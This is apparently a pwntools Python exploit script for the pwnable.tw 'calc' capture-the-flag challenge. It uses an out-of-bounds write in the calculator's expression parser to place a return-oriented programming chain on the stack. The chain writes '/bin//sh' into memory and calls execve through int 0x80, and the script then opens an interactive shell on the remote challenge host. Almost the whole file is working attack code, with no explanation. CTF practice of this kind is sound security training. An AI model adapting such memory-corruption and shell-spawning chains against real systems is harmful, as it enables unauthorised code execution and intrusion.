from pwn import *

context.log_level = 'debug'

# if(parse_expr): 0x080493f2
# while (j >= 0): 0x08049358
# if(operators[j]): 0x80491b5

# 0xffffc618: stack_length
# 0xffffcc48: leak stack address -> 0xffffcc64
ret_addr = 0xffffcbbc

def write_mem(offset, value):
    global io
    io.sendline('+' + str(360 + offset) + '+' + str(value))
    io.recvline()

# gdbscript = 'break *0x08049358\n'
# gdbscript += 'continue\n'*5
# gdbscript += 'x/500xw $esp\n'
# io = gdb.debug('./calc', gdbscript=gdbscript)
#io = process('./calc')
io = remote('chall.pwnable.tw', 10100)

# leak stack address
# io.recvuntil('===\n')
# io.sendline('+396+1')
# stack_addr = int(io.recvline()) + 2**32 - 169
# print 'stack address: ' + hex(stack_addr)
# offset = stack_addr - ret_addr

# writing payload
payload = [0x080701aa] # pop edx; ret
payload += [0x080ec060] # @ .data
payload += [0x0805c34b] # pop eax; ret
payload += [0x6e69622f] # '/bin'
payload += [0x0809b30d] # mov dword ptr [edx], eax ; ret
payload += [0x080701aa] # pop edx ; ret
payload += [0x080ec064] # @ .data + 4
payload += [0x0805c34b] # pop eax ; ret
payload += [0x68732f2f] # '//sh'
payload += [0x0809b30d] # mov dword ptr [edx], eax ; ret
payload += [0x080701aa] # pop edx ; ret
payload += [0x080ec068] # @ .data + 8
payload += [0x080550d0] # xor eax, eax ; ret
payload += [0x0809b30d] # mov dword ptr [edx], eax ; ret
payload += [0x080481d1] # pop ebx ; ret
payload += [0x080ec060] # @ .data
payload += [0x080701d1] # pop ecx ; pop ebx ; ret
payload += [0x080ec068] # @ .data + 8
payload += [0x080ec060] # padding without overwrite ebx
payload += [0x080701aa] # pop edx ; ret
payload += [0x080ec068] # @ .data + 8
payload += [0x080550d0] # xor eax, eax ; ret
payload += [0x0807cb7f] # inc eax ; ret
payload += [0x0807cb7f] # inc eax ; ret
payload += [0x0807cb7f] # inc eax ; ret
payload += [0x0807cb7f] # inc eax ; ret
payload += [0x0807cb7f] # inc eax ; ret
payload += [0x0807cb7f] # inc eax ; ret
payload += [0x0807cb7f] # inc eax ; ret
payload += [0x0807cb7f] # inc eax ; ret
payload += [0x0807cb7f] # inc eax ; ret
payload += [0x0807cb7f] # inc eax ; ret
payload += [0x0807cb7f] # inc eax ; ret
payload += [0x08049a21] # int 0x80

for i, val in list(enumerate(payload))[::-1]:
    write_mem(i, val)

# execute payload
io.sendline('')
io.interactive()